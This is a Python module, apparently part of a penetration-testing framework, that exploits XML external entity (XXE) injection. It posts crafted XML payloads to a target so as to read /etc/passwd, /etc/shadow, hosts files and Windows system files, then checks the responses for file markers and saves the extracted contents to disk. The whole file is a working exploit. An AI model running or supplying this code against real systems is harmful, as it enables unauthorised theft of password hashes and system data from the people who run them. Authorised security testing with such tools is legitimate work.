"""xxe_dump — extract files via XXE (in-band file read)"""
from core.http import HttpClient
from pathlib import Path

FILES = ["/etc/passwd","/etc/shadow","/etc/hosts","/etc/hostname",
         "c:/windows/win.ini","c:/boot.ini","c:/windows/system32/drivers/etc/hosts"]

class XxeDump:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        target = session.target

        out_dir = Path("reports") / "dump" / "xxe"
        out_dir.mkdir(parents=True, exist_ok=True)

        dumped = {}
        for f in FILES:
            payload = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{f}">]><r>&x;</r>'
            r = http.post(target, data=payload,
                          headers={"Content-Type":"application/xml"})
            if not r: continue
            if any(m in r.text for m in ["root:x:0:0","[fonts]","[extensions]","127.0.0.1"]):
                fname = f.replace("/", "_").replace(":", "")
                (out_dir / fname).write_text(r.text[:50000])
                dumped[f] = len(r.text)
                print(f"  [+] {f} -> {len(r.text)}b")
                logger.finding("xxe_dump", "critical", f"{f} extracted")
            elif len(r.content) > 200 and "<" not in r.text[:50]:
                # maybe direct content, no markers
                dumped[f] = len(r.text)
                (out_dir / f.replace("/","_")).write_text(r.text[:50000])
                print(f"  [~] {f} -> {len(r.text)}b (no markers, saved)")

        print(f"[xxe_dump] {len(dumped)} files")
        return {"dumped": list(dumped.keys())}
